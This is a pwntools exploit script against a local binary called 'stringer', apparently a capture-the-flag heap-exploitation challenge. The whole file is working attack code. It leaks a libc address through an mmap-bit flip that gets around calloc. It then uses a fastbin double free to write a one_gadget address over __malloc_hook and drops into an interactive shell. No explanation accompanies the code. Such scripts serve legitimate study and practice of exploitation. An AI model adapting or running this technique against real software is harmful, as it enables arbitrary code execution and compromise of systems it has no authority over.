from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./stringer")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./stringer")
else:
	pass

def add(size,content):
	p.sendlineafter("choice: ","1")
	p.sendlineafter("length: ",str(size))
	p.sendlineafter("content: ",content)

def change(index,byteindex):
	p.sendlineafter("choice: ","3")
	p.sendlineafter("index: ",str(index))
	p.sendlineafter("index: ",str(byteindex))

def free(index):
	p.sendlineafter("choice: ","4")
	p.sendlineafter("index: ",str(index))
	
code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x1254)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
debugf()
# change is mmap bit to bypass calloc
add(0x100 - 8,"s1")
add(0x100,"s2")
add(0x60,"s3") #2
free(1)
change(0,0x100-8)
add(0x100,"a"*7) #3
p.recvuntil("a"*7 + "\x0a")
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:"+hex(libc.address))
add(0x60,"s4") #4
# double free
free(2)
free(4)
free(2)
add(0x60,p64(libc.symbols["__malloc_hook"] - 0x23))
add(0x60,"a")
add(0x60,"a")
one_gadget = libc.address + 0xf02a4
payload = "aaa" + p64(0) * 2 + p64(one_gadget)
add(0x60,payload)
p.sendlineafter("choice: ","1")
p.sendlineafter("length: ",str(0x10))
p.interactive()
